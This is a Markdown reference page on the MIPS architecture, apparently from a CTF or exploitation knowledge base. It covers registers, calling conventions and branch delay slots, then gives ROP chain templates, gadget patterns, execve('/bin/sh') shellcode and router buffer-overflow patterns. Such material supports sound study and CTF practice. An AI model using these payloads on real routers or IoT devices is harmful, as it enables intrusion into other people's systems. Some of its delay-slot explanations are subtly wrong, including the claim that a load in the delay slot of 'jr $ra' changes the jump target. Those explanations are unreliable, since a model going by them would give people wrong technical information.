# MIPS Architecture

## Overview

**MIPS** (Microprocessor without Interlocked Pipelined Stages) is a RISC architecture commonly found in embedded systems, routers, IoT devices, and older gaming consoles (PlayStation, Nintendo 64). Understanding MIPS is essential for embedded device exploitation and router hacking.

---

## General-Purpose Registers

| Register | Number | Purpose | Preserved? |
|----------|--------|---------|------------|
| **$zero** | $0 | Always zero (hardwired) | N/A |
| **$at** | $1 | Assembler temporary | No |
| **$v0-$v1** | $2-$3 | Return values | No |
| **$a0-$a3** | $4-$7 | Function arguments | No |
| **$t0-$t7** | $8-$15 | Temporary registers | No |
| **$s0-$s7** | $16-$23 | Saved registers | Yes (callee-saved) |
| **$t8-$t9** | $24-$25 | More temporaries | No |
| **$k0-$k1** | $26-$27 | Kernel reserved | Special |
| **$gp** | $28 | Global pointer | Yes |
| **$sp** | $29 | Stack pointer | Yes |
| **$fp / $s8** | $30 | Frame pointer | Yes |
| **$ra** | $31 | Return address | Special |

### Special Registers

| Register | Description | Exploitation Impact |
|----------|-------------|---------------------|
| **PC** | Program Counter | **Primary exploit target** |
| **$ra** | Return Address | Stores return address (can be corrupted) |
| **$sp** | Stack Pointer | Points to top of stack |
| **HI/LO** | Multiply/Divide results | Special purpose |

---

## Calling Convention (O32 ABI)

### Argument Passing

| Argument | Register | Type |
|----------|----------|------|
| 1st | **$a0** | Integer/pointer |
| 2nd | **$a1** | Integer/pointer |
| 3rd | **$a2** | Integer/pointer |
| 4th | **$a3** | Integer/pointer |
| 5th+ | Stack | Right-to-left |

**Return Value:**
- **$v0** (32-bit integer/pointer)
- **$v0:$v1** (64-bit value)

### Example Function Call

```c
int add(int a, int b, int c, int d, int e) {
    return a + b + c + d + e;
}

int result = add(1, 2, 3, 4, 5);
```

**Assembly (MIPS):**
```asm
; Caller
li     $a0, 1          ; 1st arg
li     $a1, 2          ; 2nd arg
li     $a2, 3          ; 3rd arg
li     $a3, 4          ; 4th arg
li     $t0, 5
sw     $t0, 16($sp)    ; 5th arg on stack (at SP+16)
jal    add             ; Jump and Link (saves return address in $ra)
nop                    ; Branch delay slot

; Callee
add:
    addiu  $sp, $sp, -32   ; Allocate stack frame
    sw     $ra, 28($sp)    ; Save return address
    sw     $fp, 24($sp)    ; Save frame pointer
    move   $fp, $sp        ; Set frame pointer
    
    add    $v0, $a0, $a1   ; a + b
    add    $v0, $v0, $a2   ; + c
    add    $v0, $v0, $a3   ; + d
    lw     $t0, 48($sp)    ; Load 5th arg (32 + 16 = 48)
    add    $v0, $v0, $t0   ; + e
    
    move   $sp, $fp        ; Restore stack pointer
    lw     $fp, 24($sp)    ; Restore frame pointer
    lw     $ra, 28($sp)    ; Restore return address
    addiu  $sp, $sp, 32    ; Deallocate stack frame
    jr     $ra             ; Return
    nop                    ; Branch delay slot
```

---

## Branch Delay Slots (CRITICAL!)

### What is a Branch Delay Slot?

**The instruction AFTER a branch/jump executes BEFORE the branch!**

```asm
; Example 1: Normal case
beq    $t0, $t1, target   ; Branch if $t0 == $t1
addiu  $t2, $t2, 1        ; This executes BEFORE branch!
; ...
target:
    ; Branch lands here
```

**Execution Order:**
1. `addiu $t2, $t2, 1` executes
2. Branch condition evaluated
3. If true, jump to `target`

### Exploitation Impact

```asm
; Vulnerable pattern
jr     $ra              ; Jump to return address
lw     $ra, 0($sp)      ; DELAY SLOT: Loads $ra BEFORE jump!

; Exploitation:
; - Overwrite $ra on stack
; - Delay slot loads corrupted $ra
; - Jump executes with corrupted address
```

---

## Stack Frame

```
Function Prologue:
    addiu  $sp, $sp, -N    ; Allocate N bytes
    sw     $ra, N-4($sp)   ; Save return address
    sw     $fp, N-8($sp)   ; Save frame pointer
    move   $fp, $sp        ; Set frame pointer

Function Epilogue:
    move   $sp, $fp        ; Restore stack pointer
    lw     $fp, N-8($sp)   ; Restore frame pointer
    lw     $ra, N-4($sp)   ; Restore return address
    addiu  $sp, $sp, N     ; Deallocate stack frame
    jr     $ra             ; Return
    nop                    ; Branch delay slot

Complete Stack Frame:
High Memory
┌─────────────────────────────────────┐
│  Arguments 5+ (if any)              │  [SP+16], [SP+20], ...
├─────────────────────────────────────┤
│  Saved $ra (return address)         │  [SP+N-4] ← Exploit target!
├─────────────────────────────────────┤
│  Saved $fp                          │  [SP+N-8]
├─────────────────────────────────────┤
│  Saved $s0-$s7 (if used)            │
├─────────────────────────────────────┤
│  Local Variables                    │
├─────────────────────────────────────┤  ← SP
│  Unused Stack Space                 │
└─────────────────────────────────────┘
Low Memory
```

---

## Common Instructions

| Instruction | Description | Example |
|-------------|-------------|---------|
| `li $t0, imm` | Load immediate | `li $t0, 42` |
| `lw $t0, offset($t1)` | Load word from memory | `lw $t0, 0($sp)` |
| `sw $t0, offset($t1)` | Store word to memory | `sw $t0, 4($sp)` |
| `move $t0, $t1` | Move register | `move $v0, $a0` |
| `add $t0, $t1, $t2` | Addition | `add $v0, $a0, $a1` |
| `addiu $t0, $t1, imm` | Add immediate unsigned | `addiu $sp, $sp, -32` |
| `sub $t0, $t1, $t2` | Subtraction | `sub $t0, $t1, $t2` |
| `jal label` | Jump and Link (call) | `jal printf` |
| `jr $ra` | Jump to Register (return) | `jr $ra` |
| `beq $t0, $t1, label` | Branch if equal | `beq $t0, $zero, done` |
| `bne $t0, $t1, label` | Branch if not equal | `bne $t0, $t1, loop` |
| `nop` | No operation | `nop` (delay slot filler) |
| `syscall` | System call | `syscall` |

---

## MIPS vs x86/ARM Comparison

| Feature | MIPS | x86 | ARM |
|---------|------|-----|-----|
| **Endianness** | Both (configurable) | Little | Both |
| **Arguments** | $a0-$a3 (4 args) | Stack | R0-R3 (4 args) |
| **Return Address** | $ra register | Stack | LR register |
| **Branch Delay** | ✓ Yes (1 slot) | ✗ No | ✗ No |
| **Instruction Size** | 32-bit fixed | Variable (1-15 bytes) | 32-bit (ARM), 16/32-bit (Thumb) |
| **Pointer Size** | 4 bytes (MIPS32) | 4/8 bytes | 4/8 bytes |

---

## Exploitation Considerations

### 1. Return Address in $ra

```asm
vulnerable_func:
    addiu  $sp, $sp, -64   ; Allocate stack
    sw     $ra, 60($sp)    ; Save $ra on stack
    
    move   $a0, $sp        ; Buffer address
    jal    gets            ; Unbounded read!
    nop
    
    lw     $ra, 60($sp)    ; Pops corrupted $ra!
    addiu  $sp, $sp, 64
    jr     $ra             ; Jump to corrupted address
    nop
```

### 2. Branch Delay Slot Exploitation

**Gadget chaining must account for delay slots:**

```asm
; Gadget 1
jr     $t9
addiu  $sp, $sp, 0x20   ; Executes BEFORE jump!

; Gadget 2 (at $t9)
lw     $a0, 0($sp)
jr     $ra
nop
```

**ROP Chain:**
```python
# MIPS ROP chain
payload = b"A" * offset
payload += p32(gadget1)      # jr $t9; addiu $sp, $sp, 0x20
payload += p32(0xdeadbeef)   # Padding (skipped by addiu)
# ... (0x20 bytes of padding)
payload += p32(gadget2)      # Lands here after delay slot
```

### 3. Endianness

**MIPS can be Little-Endian or Big-Endian:**

```bash
# Check endianness
file router_firmware
# Output: MIPS, MIPS32 rel2, little endian

# Adjust pwntools
context.endian = 'little'  # or 'big'
```

### 4. Cache Coherency

**Instruction cache (I-cache) vs Data cache (D-cache):**

```c
// After writing shellcode to memory
cacheflush(addr, len, ICACHE);  // Flush instruction cache
```

---

## ROP Gadgets (MIPS)

### Common Gadgets

```asm
; Load arguments
lw     $a0, 0($sp); jr $ra; nop
lw     $a1, 4($sp); jr $ra; nop

; Call functions
move   $t9, $s0; jalr $t9; nop
lw     $t9, 0($sp); jalr $t9; nop

; Stack pivot
addiu  $sp, $sp, 0x100; jr $ra; nop
move   $sp, $s0; jr $ra; nop
```

### ROP Chain Example

```python
# MIPS ROP to call system("/bin/sh")
from pwn import *

context.arch = 'mips'
context.endian = 'little'

binary = ELF('./vuln_mips')

# Find gadgets (accounting for delay slots!)
lw_a0_sp = 0x00400XXX  # lw $a0, 0($sp); jr $ra; nop
jalr_s0 = 0x00400YYY   # move $t9, $s0; jalr $t9; nop

# Build chain
payload = b"A" * offset
payload += p32(lw_a0_sp)         # Load $a0 from stack
payload += p32(binsh_addr)       # $a0 = "/bin/sh"
payload += p32(jalr_s0)          # Call function in $s0
payload += p32(system_addr)      # $s0 = system
```

---

## Embedded Device Exploitation

### 1. Router Firmware Analysis

```bash
# Extract firmware
binwalk -e router_firmware.bin

# Find MIPS binaries
find . -type f -exec file {} \; | grep MIPS

# Emulate with QEMU
qemu-mips-static ./httpd
```

### 2. MIPS Shellcode

```asm
; MIPS execve("/bin/sh", NULL, NULL) shellcode
li     $v0, 4011      ; syscall number (execve)
lui    $a0, 0x2f62    ; "/bin"
ori    $a0, $a0, 0x696e
sw     $a0, -8($sp)
lui    $a0, 0x2f73    ; "/sh"
ori    $a0, $a0, 0x6800
sw     $a0, -4($sp)
addiu  $a0, $sp, -8   ; $a0 = "/bin/sh"
slti   $a1, $zero, -1 ; $a1 = NULL
slti   $a2, $zero, -1 ; $a2 = NULL
syscall
```

### 3. IoT Device Debugging

```bash
# Cross-compile GDB server
mips-linux-gnu-gcc -static -o gdbserver gdbserver.c

# Run on device
./gdbserver :1234 ./vulnerable_binary

# Connect from host
gdb-multiarch ./vulnerable_binary
(gdb) target remote 192.168.1.1:1234
```

---

## CTF Tips

### 1. Identifying MIPS Binaries

```bash
file binary
# Output: ELF 32-bit LSB executable, MIPS, MIPS32 rel2, ...

readelf -h binary | grep Machine
# Output: Machine: MIPS R3000
```

### 2. Cross-Compilation

```bash
# Install cross-compiler
sudo apt install gcc-mips-linux-gnu

# Compile for MIPS
mips-linux-gnu-gcc -o vuln_mips vuln.c -static
```

### 3. Emulation (QEMU)

```bash
# Install QEMU
sudo apt install qemu-user

# Run MIPS binary on x86
qemu-mips ./vuln_mips

# With GDB
qemu-mips -g 1234 ./vuln_mips
gdb-multiarch ./vuln_mips
(gdb) target remote :1234
```

### 4. Delay Slot Awareness

**Always check instruction after branch/jump:**

```bash
# Disassemble with objdump
mips-linux-gnu-objdump -d binary | less

# Look for:
jr     $ra
<delay slot instruction>  ← This executes first!
```

---

## Real-World Examples

### 1. Router Exploitation (CVE-2019-XXXX)

**Vulnerable Pattern:**
```c
void handle_request(char *input) {
    char buffer[256];
    strcpy(buffer, input);  // Buffer overflow!
}
```

**Exploitation:**
- Overflow buffer to overwrite saved $ra
- Return to ROP chain or shellcode
- Gain root shell on router

### 2. IoT Camera Backdoor

**Hidden Function:**
```c
void debug_shell() {
    system("/bin/sh");
}
```

**Exploitation:**
- Find `debug_shell` address
- Overflow to return to `debug_shell`

---

## Further Reading

- [MIPS Architecture Reference](https://www.mips.com/products/architectures/)
- [MIPS Calling Conventions](https://courses.cs.washington.edu/courses/cse410/09sp/examples/MIPSCallingConventionsSummary.pdf)
- [MIPS ROP Exploitation](https://www.exploit-db.com/docs/english/17219-mips-rop-exploitation.pdf)
- [Router Hacking with MIPS](https://www.devttys0.com/blog/)

---

**Related:** [ARM](../ARM/) | [ARM64](../ARM64/) | [x86](../x86/)
